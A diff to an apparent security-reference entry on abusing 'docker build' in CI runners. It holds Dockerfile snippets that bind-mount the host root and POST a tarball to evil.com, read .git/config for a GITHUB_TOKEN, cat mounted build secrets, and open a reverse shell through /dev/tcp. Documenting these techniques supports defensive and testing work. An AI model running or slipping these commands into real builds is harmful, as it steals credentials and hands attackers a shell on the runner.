@@ -5,32 +5,36 @@ tags:
   - config-file
   - eval-sh
 references: 
+  - https://docs.docker.com/reference/dockerfile/
+  - https://docs.docker.com/build/concepts/dockerfile/
 files: [Dockerfile]
 ---
 
-Docker is a container tool to create OCI image and run containers. The build stage can be configured using a Dockerfile. See [Dockerfile reference](https://docs.docker.com/reference/dockerfile/) and [Dockerfile overview](https://docs.docker.com/build/concepts/dockerfile/). 
+`docker` is a container tool to create OCI image and run containers. The build stage can be configured using a Dockerfile.
+`docker build <path>` is strongly limited to the build context. No modification can be done to the file system.
 
-## `docker build`
-
-`docker build <path>` allow RCE in the limited context of the build:
-  - if the Dockerfile can be modified, by adding `RUN <sh_cmd>`.
-  - if the input of `RUN` is controllable.
-Since the build command set the context to a copy of the current folder, we can't the filesystem. If we have control over the context path `docker build <controlled_path> -f <Dockerfile>`, we can exfiltrate any data from the host.
-
-
-Exfiltrate every file available
+Exfiltrate **GITHUB_TOKEN**
 ```Dockerfile
-FROM alpine/curl
 RUN --mount=type=bind,source=/,target=/host \
-    tar -czf /src.tar.gz /host/*;
-RUN curl -X POST -d "/src.tar.gz" http://evil.com
+    cat /host/.git/config
 ```
 
-Exflitrating runner secrets
+If the context path is controllable `docker build <controlled_path> -f <Dockerfile>`, any data from the runner is exfiltrable.
 ```Dockerfile
-FROM alpine/curl
-RUN --mount=type=secret,id=<secret_name> \
-    curl -X POST -d "@/run/secrets/<secret_name>" http://evil.com;
 RUN --mount=type=bind,source=/,target=/host \
-    curl -X POST -d "/host/.git/config" http://evil.com
+    tar -czf /src.tar.gz /host/* ; \
+    curl -X POST -d "/src.tar.gz" http://evil.com
+```
+
+Exfiltrate runner secrets, if secrets are used: `docker build --secret id=mysecret,src=secretFile .`
+```Dockerfile
+RUN --mount=type=secret,id=mysecret \
+    cat /run/secrets/mysecret
+```
+
+The image can be modified for RCE on creation of the container:
+```Dockerfile
+FROM linuxserver/openssh-server
+FROM myorg/evil 
+RUN sh -i >& /dev/tcp/10.10.0.2/443 0>&1
 ```
